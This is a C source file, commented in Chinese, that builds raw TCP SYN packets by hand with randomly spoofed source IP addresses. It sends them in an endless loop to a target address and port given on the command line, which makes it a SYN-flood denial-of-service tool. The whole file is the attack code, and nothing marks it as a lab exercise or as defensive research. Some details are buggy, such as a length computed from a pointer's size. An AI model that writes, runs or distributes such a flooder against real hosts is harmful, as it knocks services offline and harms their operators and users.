#include <stdio.h>
#include <stdlib.h>
#include <string.h>
 
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netdb.h>
#include <errno.h>
#include <arpa/inet.h>
#include <signal.h>
#include <sys/time.h>
struct tcphdr {
    unsigned short      sport;    
    unsigned short      dport;    
    unsigned int        seq;      
    unsigned int        ack_seq;  
    unsigned char       len;      
    unsigned char       flag;     
    unsigned short      win;      
    unsigned short      checksum; 
    unsigned short      urg;      
};
struct pseudohdr {
    unsigned int        saddr;
    unsigned int        daddr;
    char                zeros;
    char                protocol;
    unsigned short      length;
};
struct iphdr {
    unsigned char       ver_and_hdrlen;
    unsigned char       tos;           
    unsigned short      total_len;     
    unsigned short      id;            
    unsigned short      flags;         
    unsigned char       ttl;           
    unsigned char       protocol;      
    unsigned short      checksum;      //设置为0，系统内核自动补充
    unsigned int        srcaddr;       
    unsigned int        dstaddr;       
};
unsigned short my_cksum(unsigned short *buffer, unsigned short size)     //inline
{  
    unsigned long cksum = 0;

    while (size > 1) {
        cksum += *buffer++;
        size  -= sizeof(unsigned short);
    }

    if (size) {
        cksum += *(unsigned char *)buffer;
    }

    cksum = (cksum >> 16) + (cksum & 0xffff);
    cksum += (cksum >> 16);     

    return (unsigned short )(~cksum);
}
void init_ip(struct iphdr*iphdr,  unsigned int saddr, unsigned int daddr){
    int len = sizeof(iphdr) + sizeof(struct tcphdr);

    iphdr->ver_and_hdrlen = (4 << 4 | sizeof(struct iphdr) / sizeof(unsigned int));
    iphdr->tos = 0;
    iphdr->total_len = htons(len);
    iphdr->id = 1;
    iphdr->flags = 0x40;
    iphdr->ttl = 255;
    iphdr->protocol = IPPROTO_TCP;
    iphdr->checksum = 0;
    iphdr->srcaddr = saddr; // 源IP地址
    iphdr->dstaddr = daddr; // 目标IP地址
}
void init_tcp(struct tcphdr *tcp, unsigned short dport){
    tcp->sport = htons(8123);   // 做了一个标记
    tcp->dport = htons(dport);                    // 目标端口 设置为flag 8888
    tcp->seq = htonl(rand() % 90000000 + 2345 );  // 随机生成一个初始化序列号
    tcp->ack_seq = 0; 
    tcp->len = (sizeof(struct tcphdr) / 4 << 4 | 0);
    tcp->flag = 0x02;      //syn=1 urg ack psh  rst syn fin
    tcp->win = htons(1024);  
    tcp->checksum = 0;
    tcp->urg = 0;
}
void init_pseudo(struct pseudohdr *hdr, unsigned int saddr, unsigned int daddr)
{
    hdr->zeros = 0;
    hdr->protocol = IPPROTO_TCP;
    hdr->length = htons(sizeof(struct tcphdr));
    hdr->saddr = saddr;
    hdr->daddr = daddr;
}                     
int make_syn(char *packet, int pkt_len, unsigned int daddr, 
                    unsigned short dport)
{
    char buf[100];
    int len;
    struct iphdr ip;             // IP 头部
    struct tcphdr tcp;           // TCP 头部
    struct pseudohdr pseudo;     // TCP 伪头部
    unsigned int saddr = rand(); // 随机生成一个源IP地址

    len = sizeof(ip) + sizeof(tcp);

    // 初始化头部信息
    init_ip(&ip, saddr, daddr);
    init_tcp(&tcp, dport);
    init_pseudo(&pseudo, saddr, daddr);

    //计算IP校验和
    ip.checksum = 0;

    // 计算TCP校验和
    bzero(buf, sizeof(buf));
    memcpy(buf , &pseudo, sizeof(pseudo));           // 复制TCP伪头部
    memcpy(buf + sizeof(pseudo), &tcp, sizeof(tcp)); // 复制TCP头部
    tcp.checksum = my_cksum((u_short *)buf, sizeof(pseudo) + sizeof(tcp));;

    bzero(packet, pkt_len);
    memcpy(packet, &ip, sizeof(ip));
    memcpy(packet + sizeof(ip), &tcp, sizeof(tcp));
    
    return len;
}
int main (int argc, char*argv[])
{
    struct sockaddr_in server;
	int ret;
	int len;
	int sockfd;
	int sendnum;
	int recvnum;
	char send_buf[2048];
	char recv_buf[2048];
    int on = 1;
    if (argc < 3) {
        fprintf(stderr, "argument number error \n");
        exit(1);
    }
    unsigned int addr = inet_addr(argv[1]);  // IP
    unsigned short port ;
    port= atoi(argv[2]);       // port

    //packet argument
    char packet[256];           //设 置为256大小
    int packet_len;

    memset(&server,0,sizeof(server));

    server.sin_family = AF_INET;
    server.sin_port = htons(port);
    server.sin_addr.s_addr = addr;

    
    sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if (sockfd == -1) {
        return -1;
    }

    // 设置需要手动构建IP头部
    if (setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, (char *)&on, sizeof(on)) < 0) {
        close(sockfd);
        return -1;
    }
    if (sockfd == -1) {
        fprintf(stderr, "make raw socket error\n");
        exit(1);
    }
    while(1){
        //syn send tcp all the time
        

        packet_len = make_syn(packet, 256, addr, port);//构建tcp数据包

        sendto(sockfd, packet, packet_len, 0, (struct sockaddr *)&server,sizeof(struct sockaddr_in));
    }
    close(sockfd);
    return 0;
}
